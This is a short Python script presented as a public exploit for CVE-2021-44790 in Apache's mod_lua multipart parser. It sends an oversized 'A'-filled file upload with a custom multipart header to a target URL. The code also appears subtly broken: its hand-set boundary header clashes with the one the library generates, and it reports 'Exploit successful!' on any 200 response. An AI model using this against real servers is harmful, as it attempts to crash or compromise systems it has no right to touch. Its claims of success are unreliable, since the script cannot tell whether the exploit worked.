#CVE-2021-44790 
#Written by Sebastian D. Alexander
#For redistribution and public usage!

import requests

# Define the target URL
target_url = "http://example.com/(luafile)"

# Crafting a malicious payload
payload = "A" * 10000  # Replace "A" with your desired payload

# Creates a multipart form-data payload
multipart_payload = {
    "file": ("exploit.txt", payload, "text/plain")
}

# Set the headers to trigger the mod_lua multipart parser vulnerability
headers = {
    "Content-Type": "multipart/form-data; boundary=---------------------------1234567890"
}

# Send the malicious request with custom headers
response = requests.post(target_url, files=multipart_payload, headers=headers)

# Check the response status
if response.status_code == 200:
    print("Exploit successful!")
else:
    print("Exploit failed!")